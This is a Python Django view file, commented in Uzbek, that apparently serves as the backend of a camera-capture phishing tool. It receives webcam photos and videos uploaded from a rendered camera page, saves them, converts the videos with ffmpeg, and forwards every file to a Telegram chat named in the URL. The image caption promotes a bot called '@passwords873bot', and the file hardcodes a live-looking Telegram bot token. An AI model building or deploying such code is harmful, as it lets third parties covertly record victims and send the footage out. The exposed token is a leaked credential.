import os
import uuid
import requests
import subprocess
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile
from django.core.files.storage import default_storage
from django.shortcuts import render

TELEGRAM_BOT_TOKEN =  "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"

VIDEO_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_videos')
os.makedirs(VIDEO_DIR, exist_ok=True)



@csrf_exempt
def camera_view(request, id):

    if request.method == "GET":
        return render(request, "camera/index.html", {
            "MEDIA_URL": settings.MEDIA_URL
        })

    # ======= RASM QABUL QILISH =======
    if "image" in request.FILES:
        uploaded = request.FILES["image"]

        ext = uploaded.name.split(".")[-1]
        filename = f"{id}_{uuid.uuid4()}.{ext}"

        relative_path = f"saved_images/{filename}"                # <-- TO‘G‘RI YO‘L
        full_path = os.path.join(settings.MEDIA_ROOT, relative_path)

        # File saqlash
        with open(full_path, "wb") as f:
            for chunk in uploaded.chunks():
                f.write(chunk)

        # Telegramga yuborish
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(full_path, "rb") as f:
                requests.post(url, files={"photo": f}, data={
                    "chat_id": id,
                    "caption": "Rasm 📸\n\n@passwords873bot"
                }, timeout=20)
        except Exception as e:
            print("Telegram IMG xato:", e)

        return JsonResponse({"status": "ok", "file": filename})


    if 'video' not in request.FILES:
        return JsonResponse({"status": "error", "message": "Video kelmadi"})

    uploaded_file = request.FILES['video']

    # === 0. Papkani yaratib olish ===
    SAVE_DIR = os.path.join(settings.MEDIA_ROOT, "saved_videos")
    os.makedirs(SAVE_DIR, exist_ok=True)

    # === 1. WEBM faylni saqlash ===
    webm_filename = f"{id}_{uuid.uuid4()}.webm"
    webm_path = os.path.join(SAVE_DIR, webm_filename)

    with open(webm_path, "wb") as f:
        for chunk in uploaded_file.chunks():
            f.write(chunk)

    # === 2. MP4 nomini tayyorlash ===
    mp4_filename = f"{id}_{uuid.uuid4()}.mp4"
    mp4_path = os.path.join(SAVE_DIR, mp4_filename)

    # === 3. FFmpeg konvertatsiya ===
    try:
        subprocess.run([
            "/usr/bin/ffmpeg", "-i", webm_path,
            "-c:v", "libx264",
            "-preset", "fast",
            "-c:a", "aac",
            "-b:a", "128k",
            "-y", mp4_path
        ], check=True)

    except Exception as e:
        print("FFmpeg xato:", e)
        return JsonResponse({"status": "error", "message": "FFmpeg xato"})

    # === 4. Telegramga MP4 yuborish ===
    url = f"https://api.telegram.org/bot{settings.TELEGRAM_BOT_TOKEN}/sendVideo"

    try:
        with open(mp4_path, "rb") as vid:
            files = {"video": vid}
            data = {
                "chat_id": id,
                "caption": "📹 Video yuklandi!"
            }
            r = requests.post(url, files=files, data=data)
            print("Telegram javobi:", r.text)

    except Exception as e:
        print("Telegram yuborish xato:", e)
        return JsonResponse({"status": "error", "message": "Telegram yuborish xato"})

    # === 5. Javob qaytarish ===
    return JsonResponse({
        "status": "success",
        "type": "video",
        "filename": mp4_filename
    })